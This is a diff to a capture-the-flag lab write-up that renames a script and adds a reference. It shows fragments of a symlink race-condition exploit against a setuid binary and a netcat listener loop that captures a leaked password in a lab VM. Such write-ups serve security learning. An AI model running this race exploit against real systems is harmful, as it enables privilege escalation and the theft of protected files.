@@ -73,10 +73,10 @@ vim listener.sh
 #!/bin/sh
 while [ 42 ] ; do nc -l 6969; done
 
-# We create a shell script that will try to ping this race condition: It will call the binary between two calls to ln to try to 
+# We create a shell script that will try to exploit this race condition: It will call the binary between two calls to ln to try to 
 #	change the symbolic link running. We see the following password in our second shell:
 
-vim ping.sh
+vim raceExploit.sh
 #!/bin/sh
 touch /tmp/gabe
   while true; do
@@ -87,7 +87,7 @@ touch /tmp/gabe
 
 # Note you will need 2 terminals conntected to the ssh level10@192.168.56.101 -p 4242
 # 	Run the listener.sh first on the one.
-#		On the other run ping.sh
+#		On the other run raceExploit.sh
 #	once you see the below then stop the listener.sh with control c
 
 .*( )*.
@@ -114,3 +114,4 @@ https://linux.die.net/man/1/nc
 https://books.google.co.za/books?id=xpSSXvoQBq4C&pg=PA178&lpg=PA178&dq=what+localhost+5151&source=bl&ots=SqC25oe3eL&sig=ytJE2dfwMrG6ZMdjQfLyKKwNoaI&hl=en&sa=X&redir_esc=y#v=onepage&q=what%20localhost%205151&f=false
 https://www.lifewire.com/uses-of-commands-nice-renice-2201087
 https://www.mattandreko.com/2011/12/11/exploit-exercises-nebula-10/
+https://www.win.tue.nl/~aeb/linux/hh/hh-9.html
